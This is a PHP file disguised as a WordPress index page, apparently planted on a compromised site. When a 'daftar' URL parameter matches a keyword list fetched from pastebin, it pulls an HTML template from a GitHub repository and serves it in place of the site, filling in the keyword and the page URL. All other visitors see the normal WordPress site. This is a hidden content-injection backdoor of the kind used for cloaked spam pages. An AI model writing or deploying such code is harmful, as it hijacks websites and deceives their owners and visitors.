<?php
$keyword = $_GET['daftar'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$fullURL = $protocol . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$external_content = file_get_contents("https://pastebin.com/raw/v0UzjLTc");

if (isset($keyword)) {
    if (stripos($external_content, $keyword) !== false) {
        $page = file_get_contents("https://github.com/0xF102400/peler/raw/main/pba-uinsgd.html");
        $page = str_replace("kwbrand", $keyword, $page);
        $page = str_replace("urltunnel", $fullURL, $page);
        echo $page;
    } else {
        define('WP_USE_THEMES', true);
        require(dirname(__FILE__) . '/wp-blog-header.php');
    }
} else {
    define('WP_USE_THEMES', true);
    require(dirname(__FILE__) . '/wp-blog-header.php');
}
?>
